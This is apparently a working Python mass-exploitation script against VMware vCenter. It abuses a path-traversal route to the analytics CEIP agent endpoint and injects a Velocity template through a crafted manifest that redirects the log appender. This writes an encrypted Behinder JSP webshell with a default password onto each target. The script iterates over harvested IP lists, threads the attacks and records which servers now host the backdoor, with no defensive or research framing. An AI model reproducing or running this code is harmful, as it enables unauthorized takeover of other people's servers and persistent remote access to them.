import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
import string
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

# fofa:  title=" + ID_VC_Welcome + " && country!="CN" && country!="US"

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
    
def escape(_str):
    _str = _str.replace("&", "&amp;")
    _str = _str.replace("<", "&lt;")
    _str = _str.replace(">", "&gt;")
    _str = _str.replace("\"", "&quot;")
    return _str
    
def str_to_escaped_unicode(arg_str):
    escaped_str = ''
    for s in arg_str:
        val = ord(s)
        esc_uni = "\\u{:04x}".format(val)
        escaped_str += esc_uni
    return escaped_str
 
 
def createAgent(target, agent_name, log_param):
 
    
    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (target, agent_name, log_param)
    headers = { "Cache-Control": "max-age=0", 
               "Upgrade-Insecure-Requests": "1", 
               "User-Agent": "Mozilla/5.0", 
               "X-Deployment-Secret": "abc", 
               "Content-Type": "application/json", 
               "Connection": "close" }
               
    json_data = { "manifestSpec":{}, 
                  "objectType": "a2",
                  "collectionTriggerDataNeeded":  True,
                  "deploymentDataNeeded":True, 
                  "resultNeeded": True, 
                  "signalCollectionCompleted":True, 
                  "localManifestPath": "a7",
                  "localPayloadPath": "a8",
                  "localObfuscationMapPath": "a9" }
    try:
        requests.post(url, headers=headers, json=json_data, verify=False,timeout=9)
    except Exception as e:
        # print(e)
        pass
    
 
def generate_manifest(webshell_location, webshell):
 
    manifestData = """<manifest recommendedPageSize="500">
       <request>
          <query name="vir:VCenter">
             <constraint>
                <targetType>ServiceInstance</targetType>
             </constraint>
             <propertySpec>
                <propertyNames>content.about.instanceUuid</propertyNames>
                <propertyNames>content.about.osType</propertyNames>
                <propertyNames>content.about.build</propertyNames>
                <propertyNames>content.about.version</propertyNames>
             </propertySpec>
          </query>
       </request>
       <cdfMapping>
          <indepedentResultsMapping>
             <resultSetMappings>
                <entry>
                   <key>vir:VCenter</key>
                   <value>
                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                         <resourceItemToJsonLdMapping>
                            <forType>ServiceInstance</forType>
                         <mappingCode><![CDATA[    
                            #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                            #set($orig_log = $appender.getFile())##
                            #set($logger = $GLOBAL-logger.logger.parent)##     
                            $appender.setFile("%s")##     
                            $appender.activateOptions()##  
                            $logger.warn("%s")##   
                            $appender.setFile($orig_log)##     
                            $appender.activateOptions()##]]>
                         </mappingCode>
                         </resourceItemToJsonLdMapping>
                      </value>
                   </value>
                </entry>
             </resultSetMappings>
          </indepedentResultsMapping>
       </cdfMapping>
       <requestSchedules>
          <schedule interval="1h">
             <queries>
                <query>vir:VCenter</query>
             </queries>
          </schedule>
       </requestSchedules>
    </manifest>""" % (webshell_location, webshell)
    
    return manifestData
 
with open(r'D:\BaiduNetdiskDownload\Tools\webshell\免杀webshell\ByPassBehinder\mike.jsp','r') as f:
    content=f.read()
webshell=content
# Tas9er
def exploit(ip_, index):
    target = ip_
    # Variables
    webshell_param = id_generator(6)
    log_param = id_generator(6)
    agent_name = id_generator(6)
    shell_name = "m.jsp"
    # webshell=content
   #  print(webshell)

    webshell = """<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"""
 
    webshell_location =  "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name
    webshell = str_to_escaped_unicode(webshell)
    manifestData = generate_manifest(webshell_location,webshell)
    createAgent(target, agent_name, log_param)
    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (target, agent_name, log_param)
    headers = {"Cache-Control": "max-age=0", 
                     "Upgrade-Insecure-Requests": "1", 
                     "User-Agent": "Mozilla/5.0", 
                     "X-Deployment-Secret": "abc", 
                     "Content-Type": "application/json", 
                     "Connection": "close"}
    json_data ={"contextData": "a3", "manifestContent": manifestData, "objectId": "a2"}
    try:
        requests.post(url, headers=headers, json=json_data, verify=False,timeout=9)
        #webshell连接地址
        url = "%s/idm/..;/%s" % (target, shell_name)
        res = requests.get(url=url, headers=headers,verify=False,timeout=9)
        if res.status_code == 404 or len(res.text)==1111 or len(res.text)==146 or len(res.text)==19  or len(res.text)==57426:
            return
        print('数据包长度: ',len(res.text))
        print(index,ip_)
        print("webshell地址: %s" % url)
        print("[*]冰蝎3.0 Webshell连接密码: rebeyond" )
        with result_path.open('a+') as file:
                file.write(url+f"        {len(res.text)}"+line_break)
    except Exception as e:
        # print(e)
        pass
# url=''
# exploit(url,1)


threads = []
# with open(r'D:\Downloads\tmp\vmware_cn.txt', 'r') as file:
with open(r'D:\C#\VSCODE\python\POC_EXP\大类分类\VMware\VMwareCenter\result\test_do_US.txt','r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+1000

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 15
# print(urls)

test = 'mt'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()